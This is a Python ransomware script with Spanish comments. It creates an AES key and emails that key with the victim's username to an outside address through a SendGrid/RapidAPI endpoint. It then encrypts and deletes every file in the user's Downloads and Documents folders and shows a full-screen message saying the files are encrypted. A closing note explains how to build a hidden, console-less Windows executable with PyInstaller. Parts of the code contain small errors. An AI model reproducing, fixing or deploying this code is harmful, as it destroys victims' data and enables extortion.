#1. Importar
#import { rapidApiHost, rapidApiKey } from ".env";
from dotenv import load_dotenv
import os                   # para operaciones del sistema operativo 
import shutil               # para mover archivos
import pyAesCrypt           # para Decriptar
import secrets              # para generación de números aleatorios seguros
import tkinter as tk        # interfaz gráfica 
from tkinter import messagebox
from pathlib import Path    # para manipulación de rutas 
import requests             # solicitudes HTTP 

load_dotenv()
API_KEY = os.getenv("API_KEY")
API_HOST = os.getenv("API_HOST")

# 2. Defininir los folders a buscar, por ahora usamos Downloads y Documents porque todos los OS tienen esos folders
# Para Linux, Windows y Mac
folders_path = [
    str(os.path.join(Path.home(), "Downloads")),
    str(os.path.join(Path.home(), "Documents"))
]

# Generar la llave
# Se genera una llave aleatoria en formato hexadecimal para ser utilizada en el proceso de cifrado.
key = secrets.token.hex(16)

# La llave se envía por correo electrónico usando la biblioteca requests para realizar 
# una solicitud HTTP POST a un servicio de envío de correos.
url = "https://rapidprod-sendgrid-v1.p.rapidapi.com/mail/send"

payload = {
    "Informacion": [
        {
            "to": [{"email": "youremail@email.com"}],
            "subject": "Llave de Desencriptacion para "+str(os.getlogin()),
        }
    ],
    "De":{"email": "youremail@email.com"},
    "content": [
        {
            "type": "text/plain", 
            "value": str(key)
        }
    ]
}

# Asegúrate de definir las variables rapidApiKey y rapidApiHost antes de ejecutar el código.
# Se usa Sendgrid API de RapidAPI para enviar las claves de encriptacion via correos electrónicos.
# https://rapidapi.com/sendgrid/api/sendgrid/pricing
# Como buena practica , es recomendable que los datos sensibles como contraseñas o llaves de encriptacion no estén almacenados directamente en el codigo fuente.
headers = {
    "Content-Type": "application/json",
    "X-RapidAPI-Key": API_KEY,
    "X-RapidAPI-Host": API_HOST,
} 

response = requests.request("POST", url, json=payload, headers=headers)

print(response.text)

# Encriptar cada archivo en el folder
# Se recorren las carpetas especificadas, y cada archivo se cifra usando AES. 
# Los archivos originales se eliminan y los archivos cifrados se mueven a una nueva ubicación.
for folder_path in folders_path:
    for file in os.listdir(folder_path):
        bufferSize = 64*1024
        #Tomar el path para el archivo actual
        file_path = os.path.join(folder_path, file)
        if not file.endswith(".aes"):
            #Encriptar el archivo
            pyAesCrypt.encryptFile(file_path, file_path+";.aes", key, bufferSize)
            #Mover el archivo encriptado
            destination_path = os.path.join(folder_path, "encrypted_"+file+".aes")
            shutil.move(file_path+".aes", destination_path) 
            #eliminar el archivo original
            os.remove(file_path)

# Se utiliza tkinter para mostrar un mensaje informativo al usuario de que todos los archivos en el folder han sido encriptados.
root = tk.Tk()
root.withdraw()
root.geometry("{}x{}".format(root.winfo_screenwidth(), root.winfo_screenheight()))
messagebox.showinfo("Encripcion Completa", "Todos los archivos en el folder han sido encriptados.")
root.mainloop()


"""
Para usuarios de Windows, pueden utilizar Pyinstaller para convertir el script de cifrado en un archivo ejecutable. 
Esto permitirá que el script se ejecute sin la necesidad de tener Python instalado en la computadora. 
Para convertir el script, abran el símbolo del sistema y naveguen hasta la ubicación del script. Luego, 
ejecuten el siguiente comando:
pyinstaller --onefile cifrado.py

Usa la opción no-console en Pyinstaller
Puedes utilizar la opción no-console en Pyinstaller para evitar que aparezca la ventana de la consola cuando se ejecuta el script. 
Esto se puede lograr agregando la opción --noconsole o -w.
"""